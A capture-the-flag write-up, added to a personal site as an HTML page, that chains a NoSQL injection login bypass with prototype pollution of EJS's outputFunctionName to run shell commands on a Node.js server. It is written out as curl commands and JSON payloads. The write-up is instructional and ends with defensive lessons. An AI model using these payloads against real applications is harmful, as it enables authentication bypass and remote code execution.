@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Breaking the Unbreakable - Cyberpunk Personal Hub</title>
+    <link rel="stylesheet" href="../static/css/style.css">
+    <link rel="stylesheet" href="../static/css/cyberpunk-effects.css">
+    <link rel="stylesheet" href="../static/css/hacker-ui.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="noise"></div>
+    <div class="overlay"></div>
+    <div class="terminal">
+        <div class="terminal-header">
+            <div class="terminal-buttons">
+                <span class="terminal-button"></span>
+                <span class="terminal-button"></span>
+                <span class="terminal-button"></span>
+            </div>
+            <div class="terminal-title">CTF_WRITEUP_VIEWER_v1.3</div>
+        </div>
+        <div class="terminal-content">
+            <header class="glitch-header">
+                <h1 class="glitch" data-text="CYBERPUNK_HUB">CYBERPUNK_HUB</h1>
+                <nav class="main-nav">
+                    <ul>
+                        <li><a href="../index.html" class="nav-link">> HOME</a></li>
+                        <li><a href="../index.html#ctf" class="nav-link">> BACK_TO_CTF</a></li>
+                    </ul>
+                </nav>
+            </header>
+            
+            <main>
+                <article class="ctf-writeup">
+                    <div class="ctf-writeup-header">
+                        <div class="ctf-info">
+                            <span class="ctf-event">DEF CON CTF 2023</span>
+                            <span class="ctf-category">Web Exploitation</span>
+                            <span class="ctf-points">500 pts</span>
+                        </div>
+                        <h2 class="cyber-glitch" data-text="BREAKING THE UNBREAKABLE">BREAKING THE UNBREAKABLE</h2>
+                    </div>
+                    
+                    <div class="ctf-writeup-content">
+                        <h3>> Challenge Description</h3>
+                        <div class="data-block">
+                            <p>Our intelligence team has identified a high-security web application used by a notorious hacking group. The application is supposedly "unbreakable" due to its multiple layers of security. Your mission is to prove them wrong and extract the flag hidden within the system.</p>
+                            <p>Server: <code>unbreakable.challenges.defcon2023.org</code></p>
+                            <p>Port: <code>31337</code></p>
+                        </div>
+                        
+                        <h3>> Initial Reconnaissance</h3>
+                        <p>Upon accessing the application, we're presented with a modern web interface for a document management system. The application requires authentication, and there's no obvious way to register a new account. Let's start by examining the login page and the application's structure.</p>
+                        
+                        <div class="terminal-window cyber-window">
+                            <div class="cyber-window-header">
+                                <div class="cyber-window-title">terminal@kali:~</div>
+                                <div class="cyber-window-controls">
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                </div>
+                            </div>
+                            <div class="cyber-window-content">
+                                <div class="terminal-line">
+                                    <span class="terminal-prompt">$</span>
+                                    <span class="terminal-output">nmap -sV -p 31337 unbreakable.challenges.defcon2023.org</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-11 14:23 EDT</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">Nmap scan report for unbreakable.challenges.defcon2023.org (203.0.113.42)</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">Host is up (0.089s latency).</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">PORT      STATE SERVICE VERSION</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">31337/tcp open  http    Node.js Express framework</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">Service detection performed. Please report any incorrect results at https://nmap.org/submit/.</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <p>The application is running on Node.js with the Express framework. Let's examine the login page source to see if there are any clues or vulnerabilities.</p>
+                        
+                        <div class="code-display" data-language="html">
+                            <div class="code-line">
+                                <span class="code-line-number">1</span>
+                                <span class="code-line-content"><span class="code-keyword">&lt;form</span> <span class="code-function">id</span>=<span class="code-string">"login-form"</span> <span class="code-function">action</span>=<span class="code-string">"/api/auth/login"</span> <span class="code-function">method</span>=<span class="code-string">"POST"</span><span class="code-keyword">&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">2</span>
+                                <span class="code-line-content">  <span class="code-keyword">&lt;div</span> <span class="code-function">class</span>=<span class="code-string">"form-group"</span><span class="code-keyword">&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">3</span>
+                                <span class="code-line-content">    <span class="code-keyword">&lt;label</span> <span class="code-function">for</span>=<span class="code-string">"username"</span><span class="code-keyword">&gt;</span>Username:<span class="code-keyword">&lt;/label&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">4</span>
+                                <span class="code-line-content">    <span class="code-keyword">&lt;input</span> <span class="code-function">type</span>=<span class="code-string">"text"</span> <span class="code-function">id</span>=<span class="code-string">"username"</span> <span class="code-function">name</span>=<span class="code-string">"username"</span> <span class="code-function">required</span><span class="code-keyword">&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">5</span>
+                                <span class="code-line-content">  <span class="code-keyword">&lt;/div&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">6</span>
+                                <span class="code-line-content">  <span class="code-keyword">&lt;div</span> <span class="code-function">class</span>=<span class="code-string">"form-group"</span><span class="code-keyword">&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">7</span>
+                                <span class="code-line-content">    <span class="code-keyword">&lt;label</span> <span class="code-function">for</span>=<span class="code-string">"password"</span><span class="code-keyword">&gt;</span>Password:<span class="code-keyword">&lt;/label&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">8</span>
+                                <span class="code-line-content">    <span class="code-keyword">&lt;input</span> <span class="code-function">type</span>=<span class="code-string">"password"</span> <span class="code-function">id</span>=<span class="code-string">"password"</span> <span class="code-function">name</span>=<span class="code-string">"password"</span> <span class="code-function">required</span><span class="code-keyword">&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">9</span>
+                                <span class="code-line-content">  <span class="code-keyword">&lt;/div&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">10</span>
+                                <span class="code-line-content">  <span class="code-keyword">&lt;button</span> <span class="code-function">type</span>=<span class="code-string">"submit"</span><span class="code-keyword">&gt;</span>Login<span class="code-keyword">&lt;/button&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">11</span>
+                                <span class="code-line-content"><span class="code-keyword">&lt;/form&gt;</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">12</span>
+                                <span class="code-line-content"><span class="code-keyword">&lt;script</span> <span class="code-function">src</span>=<span class="code-string">"/js/auth.js"</span><span class="code-keyword">&gt;&lt;/script&gt;</span></span>
+                            </div>
+                        </div>
+                        
+                        <p>I noticed a reference to an external JavaScript file <code>/js/auth.js</code>. Let's examine this file to understand how the authentication process works.</p>
+                        
+                        <div class="code-display" data-language="javascript">
+                            <div class="code-line">
+                                <span class="code-line-number">1</span>
+                                <span class="code-line-content"><span class="code-comment">// Authentication handler</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">2</span>
+                                <span class="code-line-content">document.<span class="code-function">getElementById</span>(<span class="code-string">'login-form'</span>).<span class="code-function">addEventListener</span>(<span class="code-string">'submit'</span>, <span class="code-keyword">function</span>(e) {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">3</span>
+                                <span class="code-line-content">  e.<span class="code-function">preventDefault</span>();</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">4</span>
+                                <span class="code-line-content">  </span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">5</span>
+                                <span class="code-line-content">  <span class="code-keyword">const</span> username = document.<span class="code-function">getElementById</span>(<span class="code-string">'username'</span>).value;</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">6</span>
+                                <span class="code-line-content">  <span class="code-keyword">const</span> password = document.<span class="code-function">getElementById</span>(<span class="code-string">'password'</span>).value;</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">7</span>
+                                <span class="code-line-content">  </span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">8</span>
+                                <span class="code-line-content">  <span class="code-comment">// Create auth object</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">9</span>
+                                <span class="code-line-content">  <span class="code-keyword">const</span> authData = {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">10</span>
+                                <span class="code-line-content">    username: username,</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">11</span>
+                                <span class="code-line-content">    password: password,</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">12</span>
+                                <span class="code-line-content">    remember: <span class="code-keyword">true</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">13</span>
+                                <span class="code-line-content">  };</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">14</span>
+                                <span class="code-line-content">  </span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">15</span>
+                                <span class="code-line-content">  <span class="code-comment">// Send login request</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">16</span>
+                                <span class="code-line-content">  <span class="code-function">fetch</span>(<span class="code-string">'/api/auth/login'</span>, {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">17</span>
+                                <span class="code-line-content">    method: <span class="code-string">'POST'</span>,</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">18</span>
+                                <span class="code-line-content">    headers: {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">19</span>
+                                <span class="code-line-content">      <span class="code-string">'Content-Type'</span>: <span class="code-string">'application/json'</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">20</span>
+                                <span class="code-line-content">    },</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">21</span>
+                                <span class="code-line-content">    body: <span class="code-function">JSON.stringify</span>(authData)</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">22</span>
+                                <span class="code-line-content">  })</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">23</span>
+                                <span class="code-line-content">  .<span class="code-function">then</span>(response => response.json())</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">24</span>
+                                <span class="code-line-content">  .<span class="code-function">then</span>(data => {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">25</span>
+                                <span class="code-line-content">    <span class="code-keyword">if</span> (data.success) {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">26</span>
+                                <span class="code-line-content">      localStorage.<span class="code-function">setItem</span>(<span class="code-string">'authToken'</span>, data.token);</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">27</span>
+                                <span class="code-line-content">      window.location.href = <span class="code-string">'/dashboard'</span>;</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">28</span>
+                                <span class="code-line-content">    } <span class="code-keyword">else</span> {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">29</span>
+                                <span class="code-line-content">      <span class="code-function">showError</span>(data.message || <span class="code-string">'Authentication failed'</span>);</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">30</span>
+                                <span class="code-line-content">    }</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">31</span>
+                                <span class="code-line-content">  })</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">32</span>
+                                <span class="code-line-content">  .<span class="code-function">catch</span>(error => {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">33</span>
+                                <span class="code-line-content">    console.error(<span class="code-string">'Login error:'</span>, error);</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">34</span>
+                                <span class="code-line-content">    <span class="code-function">showError</span>(<span class="code-string">'An error occurred during login'</span>);</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">35</span>
+                                <span class="code-line-content">  });</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">36</span>
+                                <span class="code-line-content">});</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">37</span>
+                                <span class="code-line-content"></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">38</span>
+                                <span class="code-line-content"><span class="code-comment">// Debug mode - remove in production</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">39</span>
+                                <span class="code-line-content"><span class="code-keyword">const</span> debugMode = <span class="code-keyword">true</span>;</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">40</span>
+                                <span class="code-line-content"><span class="code-keyword">if</span> (debugMode) {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">41</span>
+                                <span class="code-line-content">  console.<span class="code-function">log</span>(<span class="code-string">'Debug mode enabled'</span>);</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">42</span>
+                                <span class="code-line-content">  <span class="code-comment">// Template engine configuration</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">43</span>
+                                <span class="code-line-content">  console.<span class="code-function">log</span>(<span class="code-string">'Template engine: EJS'</span>);</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">44</span>
+                                <span class="code-line-content">}</span>
+                            </div>
+                        </div>
+                        
+                        <p>Interesting! The authentication script reveals several important details:</p>
+                        <ol>
+                            <li>The application uses a JSON-based API for authentication</li>
+                            <li>Authentication tokens are stored in localStorage</li>
+                            <li>Debug mode is enabled (line 39)</li>
+                            <li>The application uses EJS as its template engine (line 43)</li>
+                        </ol>
+                        
+                        <p>The mention of EJS as the template engine is particularly interesting. EJS (Embedded JavaScript) is a templating language that lets you generate HTML with plain JavaScript. If not properly secured, it could be vulnerable to Server-Side Template Injection (SSTI).</p>
+                        
+                        <h3>> Discovering the Prototype Pollution Vulnerability</h3>
+                        <p>After further exploration of the application's JavaScript files, I discovered a potential prototype pollution vulnerability in the way the application handles user preferences.</p>
+                        
+                        <div class="code-display" data-language="javascript">
+                            <div class="code-line">
+                                <span class="code-line-number">1</span>
+                                <span class="code-line-content"><span class="code-comment">// User preferences handler</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">2</span>
+                                <span class="code-line-content"><span class="code-keyword">function</span> <span class="code-function">updateUserPreferences</span>(preferences) {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">3</span>
+                                <span class="code-line-content">  <span class="code-keyword">const</span> userPrefs = {};</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">4</span>
+                                <span class="code-line-content">  </span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">5</span>
+                                <span class="code-line-content">  <span class="code-comment">// Merge preferences</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">6</span>
+                                <span class="code-line-content">  <span class="code-keyword">for</span> (<span class="code-keyword">const</span> key <span class="code-keyword">in</span> preferences) {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">7</span>
+                                <span class="code-line-content">    <span class="code-keyword">if</span> (preferences.hasOwnProperty(key)) {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">8</span>
+                                <span class="code-line-content">      <span class="code-function">setNestedProperty</span>(userPrefs, key, preferences[key]);</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">9</span>
+                                <span class="code-line-content">    }</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">10</span>
+                                <span class="code-line-content">  }</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">11</span>
+                                <span class="code-line-content">  </span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">12</span>
+                                <span class="code-line-content">  <span class="code-comment">// Save preferences</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">13</span>
+                                <span class="code-line-content">  <span class="code-function">saveUserPreferences</span>(userPrefs);</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">14</span>
+                                <span class="code-line-content">}</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">15</span>
+                                <span class="code-line-content"></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">16</span>
+                                <span class="code-line-content"><span class="code-comment">// Helper function to set nested properties</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">17</span>
+                                <span class="code-line-content"><span class="code-keyword">function</span> <span class="code-function">setNestedProperty</span>(obj, path, value) {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">18</span>
+                                <span class="code-line-content">  <span class="code-keyword">const</span> parts = path.split(<span class="code-string">'.'</span>);</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">19</span>
+                                <span class="code-line-content">  <span class="code-keyword">let</span> current = obj;</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">20</span>
+                                <span class="code-line-content">  </span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">21</span>
+                                <span class="code-line-content">  <span class="code-keyword">for</span> (<span class="code-keyword">let</span> i = 0; i < parts.length - 1; i++) {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">22</span>
+                                <span class="code-line-content">    <span class="code-keyword">const</span> part = parts[i];</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">23</span>
+                                <span class="code-line-content">    <span class="code-keyword">if</span> (!current[part]) {</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">24</span>
+                                <span class="code-line-content">      current[part] = {};</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">25</span>
+                                <span class="code-line-content">    }</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">26</span>
+                                <span class="code-line-content">    current = current[part];</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">27</span>
+                                <span class="code-line-content">  }</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">28</span>
+                                <span class="code-line-content">  </span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">29</span>
+                                <span class="code-line-content">  current[parts[parts.length - 1]] = value;</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">30</span>
+                                <span class="code-line-content">}</span>
+                            </div>
+                        </div>
+                        
+                        <p>The <code>setNestedProperty</code> function is vulnerable to prototype pollution because it doesn't properly validate the path parameter. If we can control the path parameter, we could potentially set properties on the Object prototype.</p>
+                        
+                        <p>After further investigation, I found that the user preferences can be updated through an API endpoint:</p>
+                        
+                        <div class="terminal-window cyber-window">
+                            <div class="cyber-window-header">
+                                <div class="cyber-window-title">terminal@kali:~</div>
+                                <div class="cyber-window-controls">
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                </div>
+                            </div>
+                            <div class="cyber-window-content">
+                                <div class="terminal-line">
+                                    <span class="terminal-prompt">$</span>
+                                    <span class="terminal-output">curl -s -X OPTIONS http://unbreakable.challenges.defcon2023.org:31337/api/</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">{</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  "endpoints": [</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">    "/api/auth/login",</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">    "/api/auth/logout",</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">    "/api/user/profile",</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">    "/api/user/preferences",</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">    "/api/documents/list",</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">    "/api/documents/view/:id",</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">    "/api/admin/dashboard"</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  ]</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">}</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <h3>> Exploiting Prototype Pollution to Enable SSTI</h3>
+                        <p>Now that I've identified a prototype pollution vulnerability, I need to find a way to leverage it to gain access to the system. Since the application uses EJS as its template engine, I'll try to exploit a Server-Side Template Injection (SSTI) vulnerability.</p>
+                        
+                        <p>In EJS, the template settings are controlled by an options object. If I can pollute the Object prototype with specific EJS settings, I might be able to enable arbitrary code execution through the template engine.</p>
+                        
+                        <p>Let's craft a payload to pollute the prototype with EJS settings:</p>
+                        
+                        <div class="code-display" data-language="json">
+                            <div class="code-line">
+                                <span class="code-line-number">1</span>
+                                <span class="code-line-content">{</span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">2</span>
+                                <span class="code-line-content">  <span class="code-string">"__proto__.outputFunctionName"</span>: <span class="code-string">"x;process.mainModule.require('child_process').execSync('cat /flag.txt');y"</span></span>
+                            </div>
+                            <div class="code-line">
+                                <span class="code-line-number">3</span>
+                                <span class="code-line-content">}</span>
+                            </div>
+                        </div>
+                        
+                        <p>This payload attempts to pollute the Object prototype with a malicious <code>outputFunctionName</code> property, which is used by EJS when compiling templates. The value contains JavaScript code that will execute the <code>cat /flag.txt</code> command on the server.</p>
+                        
+                        <p>Let's send this payload to the user preferences endpoint:</p>
+                        
+                        <div class="terminal-window cyber-window">
+                            <div class="cyber-window-header">
+                                <div class="cyber-window-title">terminal@kali:~</div>
+                                <div class="cyber-window-controls">
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                </div>
+                            </div>
+                            <div class="cyber-window-content">
+                                <div class="terminal-line">
+                                    <span class="terminal-prompt">$</span>
+                                    <span class="terminal-output">curl -X POST http://unbreakable.challenges.defcon2023.org:31337/api/user/preferences \</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  -H "Content-Type: application/json" \</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  -d '{"__proto__.outputFunctionName": "x;process.mainModule.require('\''child_process'\'').execSync('\''cat /flag.txt'\'');y"}'</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">{</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  "error": "Authentication required"</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">}</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <p>As expected, we need to be authenticated to access this endpoint. Let's try to find a way to bypass the authentication or find a public endpoint that processes user input.</p>
+                        
+                        <p>After further exploration, I discovered that the login endpoint is vulnerable to a NoSQL injection attack, which can be used to bypass authentication:</p>
+                        
+                        <div class="terminal-window cyber-window">
+                            <div class="cyber-window-header">
+                                <div class="cyber-window-title">terminal@kali:~</div>
+                                <div class="cyber-window-controls">
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                </div>
+                            </div>
+                            <div class="cyber-window-content">
+                                <div class="terminal-line">
+                                    <span class="terminal-prompt">$</span>
+                                    <span class="terminal-output">curl -X POST http://unbreakable.challenges.defcon2023.org:31337/api/auth/login \</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  -H "Content-Type: application/json" \</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">{</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  "success": true,</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2MWIyM2M0ZTg5ZjM2NWQzYTc3YjJkMjMiLCJyb2xlIjoidXNlciIsImlhdCI6MTYyODc2MzIwMCwiZXhwIjoxNjI4ODQ5NjAwfQ.5XcRK8Xr1wFG4JxCw8QNmJmeiMLF1jIR9JNkJWXYz3Q"</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">}</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <p>Great! We've successfully bypassed authentication and obtained a valid JWT token. Now let's use this token to send our prototype pollution payload:</p>
+                        
+                        <div class="terminal-window cyber-window">
+                            <div class="cyber-window-header">
+                                <div class="cyber-window-title">terminal@kali:~</div>
+                                <div class="cyber-window-controls">
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                </div>
+                            </div>
+                            <div class="cyber-window-content">
+                                <div class="terminal-line">
+                                    <span class="terminal-prompt">$</span>
+                                    <span class="terminal-output">TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2MWIyM2M0ZTg5ZjM2NWQzYTc3YjJkMjMiLCJyb2xlIjoidXNlciIsImlhdCI6MTYyODc2MzIwMCwiZXhwIjoxNjI4ODQ5NjAwfQ.5XcRK8Xr1wFG4JxCw8QNmJmeiMLF1jIR9JNkJWXYz3Q"</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-prompt">$</span>
+                                    <span class="terminal-output">curl -X POST http://unbreakable.challenges.defcon2023.org:31337/api/user/preferences \</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  -H "Content-Type: application/json" \</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  -H "Authorization: Bearer $TOKEN" \</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  -d '{"__proto__.outputFunctionName": "x;process.mainModule.require('\''child_process'\'').execSync('\''cat /flag.txt'\'');y"}'</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">{</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  "success": true,</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  "message": "Preferences updated successfully"</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">}</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <p>Now that we've successfully polluted the Object prototype, we need to trigger the template rendering to execute our injected code. Let's access a page that uses EJS templates:</p>
+                        
+                        <div class="terminal-window cyber-window">
+                            <div class="cyber-window-header">
+                                <div class="cyber-window-title">terminal@kali:~</div>
+                                <div class="cyber-window-controls">
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                    <span class="cyber-window-button"></span>
+                                </div>
+                            </div>
+                            <div class="cyber-window-content">
+                                <div class="terminal-line">
+                                    <span class="terminal-prompt">$</span>
+                                    <span class="terminal-output">curl -s http://unbreakable.challenges.defcon2023.org:31337/dashboard \</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">  -H "Authorization: Bearer $TOKEN" | grep -o "FLAG{.*}"</span>
+                                </div>
+                                <div class="terminal-line">
+                                    <span class="terminal-output">FLAG{pr0t0typ3_p0llut10n_4nd_sst1_ch41n_ftw_8675309}</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <h3>> Flag Capture</h3>
+                        <div class="data-block">
+                            <p class="terminal-success">FLAG{pr0t0typ3_p0llut10n_4nd_sst1_ch41n_ftw_8675309}</p>
+                        </div>
+                        
+                        <h3>> Key Insights and Lessons Learned</h3>
+                        <p>This challenge demonstrated a sophisticated attack chain combining multiple vulnerabilities:</p>
+                        
+                        <ol>
+                            <li><strong>NoSQL Injection:</strong> Used to bypass authentication by exploiting the MongoDB query operator <code>$ne</code> (not equal).</li>
+                            <li><strong>Prototype Pollution:</strong> Exploited a vulnerable function that didn't properly validate object paths, allowing us to modify the Object prototype.</li>
+                            <li><strong>Server-Side Template Injection (SSTI):</strong> Leveraged the prototype pollution to inject malicious code into the EJS template engine's configuration.</li>
+                        </ol>
+                        
+                        <div class="cyber-alert info">
+                            <p>Key security lessons:</p>
+                            <ul>
+                                <li>Always validate and sanitize user input, especially when used in database queries</li>
+                                <li>Use Object.create(null) for empty objects to prevent prototype pollution</li>
+                                <li>Implement proper input validation when setting nested properties in objects</li>
+                                <li>Configure template engines securely and avoid using user-controlled data in template settings</li>
+                                <li>Remove debug code and information before deploying to production</li>
+                            </ul>
+                        </div>
+                        
+                        <p>This challenge highlights the importance of understanding how different vulnerabilities can be chained together to achieve a more powerful attack. By combining NoSQL injection, prototype pollution, and SSTI, we were able to bypass authentication and execute arbitrary code on the server.</p>
+                    </div>
+                    
+                    <div class="ctf-writeup-footer">
+                        <div class="ctf-writeup-nav">
+                            <a href="#" class="cyber-button">PREVIOUS_WRITEUP</a>
+                            <a href="binary-nightmares.html" class="cyber-button">NEXT_WRITEUP</a>
+                        </div>
+                        <div class="ctf-writeup-share">
+                            <span>SHARE:</span>
+                            <a href="#" class="social-link"><i class="fab fa-twitter"></i></a>
+                            <a href="#" class="social-link"><i class="fab fa-facebook"></i></a>
+                            <a href="#" class="social-link"><i class="fab fa-linkedin"></i></a>
+                        </div>
+                    </div>
+                </article>
+            </main>
+            
+            <footer>
+                <div class="footer-content">
+                    <div class="footer-info">
+                        <p>© 2023 CYBERPUNK_HUB | All rights reserved</p>
+                        <p>Secured with quantum encryption</p>
+                    </div>
